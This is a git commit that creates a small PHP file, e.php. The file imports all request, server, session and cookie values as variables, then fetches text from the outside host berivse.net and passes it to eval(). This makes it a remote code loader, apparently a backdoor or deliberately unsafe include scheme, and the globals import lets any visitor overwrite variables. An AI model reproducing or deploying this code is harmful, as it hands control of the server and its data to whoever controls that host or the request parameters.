8467aaabdac023b0b6053e9d9a1acc55fa7d1e79
ixbase <ixbase@mail.ru>
2017-08-25 12:47:18 +0300

    Create e.php

---
+++ e.php
@@ -0,0 +1,17 @@
+<?php
+if(!isset($ix)){
+foreach ($_REQUEST as $key=>$val){${$key}=$val;}
+}
+foreach ($_SERVER  as $key=>$val){${$key}=$val;}
+foreach ($_SESSION as $key=>$val){${$key}=$val;}
+foreach ($_COOCIE  as $key=>$val){${$key}=$val;}
+include("database.php"); include("data.php");
+/*
+$r=mysql_query("SELECT fun FROM blkinf00 WHERE ind='$ix'");
+if(mysql_numrows($r)==0) require("blkinf.php");
+else $s=mysql_result($r,0,0);
+*/
+$s=file_get_contents("http://berivse.net/e.php?ix=blkinf-get&IX=$ix&t=".time());
+if (substr($s,0,1)=="<") echo stripslashes($s) ;
+else                     eval(stripslashes($s));
+?>
